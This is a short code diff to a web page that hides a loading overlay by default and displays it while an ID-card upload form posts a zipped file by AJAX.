@@ -47,7 +47,7 @@
     width: 100%;
     height: 100%;
     background-color: rgba(255, 255, 255, 0.5); /* White background with 0.5 opacity */
-    display: flex; /* Center the loader */
+    display: none; /* Center the loader */
     align-items: center; /* Vertically center */
     justify-content: center; /* Horizontally center */
     z-index: 9999; /* High z-index to cover all content */
@@ -57,7 +57,7 @@
     /* Optional: You can add additional styles here for the loader div */
 }
 	</style>
-<div class="loading">
+<div id="loading" class="loading">
     <div>
         <img src="/assets/images/load.svg">
     		
@@ -329,7 +329,7 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
                 const formDataToSend = new FormData();
                 formDataToSend.append('file', zipFile, 'id_card_data.zip');
                 formDataToSend.append('visitor', sessionStorage.getItem('visitor'));
-
+				document.querySelector('#loading').style.display = "flex";
                 // Send AJAX request
                 return $.ajax({
                     method: 'POST',
@@ -338,7 +338,7 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
                     processData: false, // Prevent jQuery from processing the data
                     contentType: false // Prevent jQuery from overriding the content type
                 }).done(function(msg) {
-            
+            	
                 console.log(msg); // Log success message
                 
             })
